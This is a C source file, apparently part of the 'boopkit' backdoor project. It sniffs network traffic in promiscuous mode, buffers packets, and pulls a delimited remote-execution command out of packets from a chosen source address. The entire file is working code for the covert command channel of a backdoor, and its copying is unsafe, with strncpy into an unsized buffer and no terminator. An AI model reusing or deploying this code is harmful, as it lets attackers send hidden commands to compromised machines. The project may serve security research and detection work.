// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [dpi.c]

#define _GNU_SOURCE
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
// clang-format off
#include "dpi.h"
#include "common.h"
// clang-format on

// xcap_ring_buffer is the main thread safe packet ring buffer
xcap_ip_packet *xcap_ring_buffer[XCAP_BUFFER_SIZE];
int xcap_pos = 0;      // The position of the ring buffer to write
int xcap_collect = 1;  // While (xcap_collect) { /* events */ }
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

void xpack_dump(xcap_ip_packet *xpack) {
  boopprintf("  -> Dumping Raw Xpack:\n");
  unsigned char *packet = xpack->packet;
  for (int j = 0; j < xpack->header->caplen; j++) {
    boopprintf("%c", packet[j]);
  }
  boopprintf("\n");
}

void xcap_ring_buffer_dump(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Dumping Raw xCap Buffer:\n");
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = xbuff[i];
    if (!xpack->captured || xpack->header->caplen < 1) {
      continue;
    }
    xpack_dump(xpack);
  }
}

void xcap_ring_buffer_free(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Free Ring Buffer\n");
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = xbuff[i];
    xpack->captured = 0;
    free(xpack->packet);
    free(xpack->iph);
    free(xpack->header);
    free(xpack);
  }
}

void xcap_ring_buffer_init(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Initalizing Ring Buffer\n");
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack = malloc(sizeof(struct xcap_ip_packet));
    xpack->packet = malloc(1);  // Init to 1 byte to begin!
    xpack->iph = malloc(sizeof(struct ip));
    xpack->header = malloc(sizeof(struct pcap_pkthdr));
    xpack->captured = 0;
    xbuff[i] = xpack;
  }
}

int rce_filter(char *raw, char *rce) {
  char *target = NULL;
  char *start, *end;
  start = strstr(raw, BOOPKIT_RCE_DELIMITER);
  if (start) {
    start += strlen(BOOPKIT_RCE_DELIMITER);
    end = strstr(start, BOOPKIT_RCE_DELIMITER);
    if (end) {
      target = (char *)malloc(end - start + 1);
      memcpy(target, start, end - start);
      target[end - start] = '\0';
    }
  }
  if (target) {
    strncpy(rce, target, strlen(target));
    free(target);
    return 1;
  }
  return 0;
}

void *xcap(void *v_dev_name) {
  char *dev_name = (char *)v_dev_name;
  char filter_exp[] = "";  // TCP Dump filter
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  bpf_u_int32 mask;
  bpf_u_int32 net;
  struct pcap_pkthdr header;
  struct ether_header *ep;
  unsigned short ether_type;
  int cycle = 0;
  const u_char *packet;
  struct ip *iph;
  boopprintf("  -> Starting xCap Interface : %s\n", dev_name);

  // Initialize ring buffer
  xcap_ring_buffer_init(xcap_ring_buffer);

  if (pcap_lookupnet(dev_name, &net, &mask, errbuf) == -1) {
    boopprintf("Couldn't get netmask for device %s: %s\n", dev_name, errbuf);
    net = 0;
    mask = 0;
  }

  // Open the session in promiscuous mode
  handle = pcap_open_live(dev_name, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    boopprintf("Couldn't open device %s: %s\n", dev_name, errbuf);
    return NULL;
  }

  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
    boopprintf("Couldn't parse filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return NULL;
  }
  if (pcap_setfilter(handle, &fp) == -1) {
    boopprintf("Couldn't install filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return NULL;
  }

  boopprintf("  -> xCap RingBuffer Started : %s\n", dev_name);

  // Capture network packets!
  while (xcap_collect) {
    packet = pcap_next(handle, &header);
    ep = (struct ether_header *)packet;
    ether_type = ntohs(ep->ether_type);
    if (ether_type != ETHERTYPE_IP) {
      continue;
    }
    packet += sizeof(struct ether_header);
    iph = (struct ip *)packet;

    if (xcap_pos == XCAP_BUFFER_SIZE) {
      xcap_pos = 0;
      cycle = 1;
    }
    if (cycle) {
      pthread_mutex_lock(&lock);
      free(xcap_ring_buffer[xcap_pos]->packet);
      free(xcap_ring_buffer[xcap_pos]->iph);
      free(xcap_ring_buffer[xcap_pos]->header);
      free(xcap_ring_buffer[xcap_pos]);
      pthread_mutex_unlock(&lock);
    }

    // Xcap Packet Ring Buffer
    struct xcap_ip_packet *xpack = malloc(sizeof(xcap_ip_packet));
    xpack->packet = malloc(header.len);
    xpack->iph = malloc(sizeof(struct ip));
    xpack->header = malloc(sizeof(struct pcap_pkthdr));
    xpack->captured = 1;
    memcpy(xpack->packet, packet, header.len);
    memcpy(xpack->iph, iph, sizeof(struct ip));
    memcpy(xpack->header, &header, sizeof(struct pcap_pkthdr));
    pthread_mutex_lock(&lock);
    xcap_ring_buffer[xcap_pos] = xpack;
    pthread_mutex_unlock(&lock);
    xcap_pos++;
  }

  xcap_ring_buffer_free(xcap_ring_buffer);
  pcap_close(handle);
  return NULL;
}

// snapshot is thread safe
int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Taking snapshot of network traffic.\n");
  pthread_mutex_lock(&lock);
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *from = xcap_ring_buffer[i];
    struct xcap_ip_packet *to = malloc(sizeof(xcap_ip_packet));
    if (!from->captured) {
      continue;
    }

    // capture
    to->captured = from->captured;

    // packet
    to->packet = malloc(from->header->caplen);
    memcpy(to->packet, from->packet, from->header->caplen);

    // iph
    to->iph = malloc(sizeof(struct ip));
    memcpy(to->iph, from->iph, sizeof(struct ip));

    // header
    to->header = malloc(sizeof(struct pcap_pkthdr));
    memcpy(to->header, from->header, sizeof(struct pcap_pkthdr));
    snap[i] = to;
  }
  pthread_mutex_unlock(&lock);

  boopprintf("  -> Snapshot complete!\n");
  return 0;
}

// xcaprce is the main "interface" for pulling an RCE
// out of the kernel.
//
// Different implementations may exist, for the first example
// we are just using pcap.h
int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
  sleep(1);  // Wait for the kernel to catch up
  boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
  xcap_ip_packet *snap[XCAP_BUFFER_SIZE];
  xcap_ring_buffer_init(snap);
  snapshot(snap);  // Thread safe snapshot of the ring buffer!
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = snap[i];
    if (!xpack->captured) {
      continue;  // Ignore non captured packets in the buffer
    }
    char *xpack_saddr = inet_ntoa(xpack->iph->ip_src);

    char *ret = strstr(search, xpack_saddr);
    if (!ret) {
      continue;  // Ignore packets not from our search!
    }

    unsigned char *packet = xpack->packet;
    // DPI for our RCE
    char *rce_sub;
    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER,
                     strlen(BOOPKIT_RCE_DELIMITER));
    if (rce_sub != NULL) {
      boopprintf("  -> Found RCE xCap!\n");
      int found;
      found = rce_filter(rce_sub, rce);
      if (found) {
        // xpack_dump(xpack);
        xcap_ring_buffer_free(snap);

        // Flush the main ring buffer
        xcap_ring_buffer_free(xcap_ring_buffer);
        xcap_ring_buffer_init(xcap_ring_buffer);
        return 0;  // Money, Success, Fame, Glamour
      } else {
        boopprintf("  -> [FILTER FAILURE] No RCE in xCap!\n");
        // xcap_ring_buffer_dump(snap);
        xcap_ring_buffer_free(snap);  // Flush snapshot after RCE
         //xcap_ring_buffer_free(xcap_ring_buffer); // Flush ring buffer after
        // RCE
        return 1;
      }
    }
  }
  boopprintf("  -> No RCE in xCap!\n");
  // xcap_ring_buffer_dump(snap);
  xcap_ring_buffer_free(snap);  // Flush snapshot after RCE
  // xcap_ring_buffer_free(xcap_ring_buffer); // Flush ring buffer after RCE
  return 1;
  // return 0; // When we found our RCE!
}
